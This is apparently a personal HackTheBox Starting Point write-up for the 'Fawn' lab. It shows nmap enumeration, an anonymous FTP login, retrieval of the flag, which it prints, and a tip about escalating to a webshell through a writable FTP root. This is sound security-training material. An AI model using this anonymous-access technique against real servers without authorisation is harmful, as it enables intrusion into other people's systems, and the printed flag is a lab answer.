# Fawn — HackTheBox Starting Point

**Machine:** Fawn
**Difficulty:** Very Easy
**OS:** Linux
**Category:** Starting Point
**Pwned:** 27 Jul 2026
**XP Earned:** 150

---

## Summary

Fawn introduces FTP enumeration and anonymous login exploitation. The attack path is clean and linear — Nmap reveals vsftpd 3.0.3 running on port 21, the service accepts anonymous authentication with any password, and the flag is retrieved directly via the FTP `get` command. The machine demonstrates one of the most common real-world FTP misconfigurations: leaving anonymous access enabled on a production service.

---

## Methodology

### 1. VPN Connection

```bash
sudo openvpn starting_point.ovpn
```

### 2. Host Discovery

```bash
ping -c 4 <target IP>
```

Target responded with 0% packet loss — host is alive and reachable.

### 3. Enumeration — Nmap Scan

**Initial scan:**

```bash
sudo nmap <target IP>
```

```
PORT   STATE SERVICE
21/tcp open  ftp
```

**Version detection:**

```bash
sudo nmap -sV <target IP>
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```

Only port 21 open. vsftpd 3.0.3 — no critical CVEs for this version. Vulnerability is misconfiguration, not software.

### 4. Foothold — Anonymous FTP Login

FTP servers can be configured to allow an `anonymous` account — granting access without real credentials. Any password is accepted.

```bash
ftp <target IP>
```

```
Name: anonymous
Password: anon123
230 Login successful.
ftp>
```

### 5. Flag Retrieval

```bash
ftp> ls
```

```
-rw-r--r--    1 0    0    32 Jun 04 03:25 flag.txt
```

```bash
ftp> get flag.txt
ftp> bye
cat flag.txt
```

**Flag:** `035db21c881520061c53e0536e44f815`

---

## Vulnerability Summary

| Vulnerability               | Severity | Description                                                                        |
| --------------------------- | -------- | ---------------------------------------------------------------------------------- |
| Anonymous FTP login enabled | High     | FTP service accepts unauthenticated access — any user can connect and browse files |
| Sensitive file in FTP root  | High     | Flag stored in publicly accessible FTP directory                                   |
| FTP transmits in cleartext  | Medium   | All traffic including credentials readable by anyone intercepting the connection   |

---

## FTP Status Codes Encountered

| Code | Meaning                     |
| ---- | --------------------------- |
| 220  | Service ready               |
| 230  | Login successful            |
| 200  | PORT command successful     |
| 150  | Opening data connection     |
| 226  | Transfer complete           |
| 421  | Timeout — connection closed |

---

## Key Lessons

- Always try anonymous FTP login before attempting credential attacks — it works more often than expected
- FTP transmits everything in cleartext — SFTP over SSH port 22 is the secure replacement
- `-sV` version detection is essential — knowing the exact software version shapes the attack approach
- FTP commands mirror shell commands — `ls`, `cd`, `get`, `put`, `bye` — no new syntax to learn
- Anonymous access on a writable FTP root that overlaps a web root enables webshell upload — a critical escalation path

---

## Tools Used

| Tool    | Purpose                             |
| ------- | ----------------------------------- |
| OpenVPN | VPN connection to HTB network       |
| ping    | Host discovery                      |
| Nmap    | Port scanning and version detection |
| ftp     | Anonymous login and file retrieval  |

---

_HackTheBox Starting Point — Fawn | Pwned 27 Jul 2026_
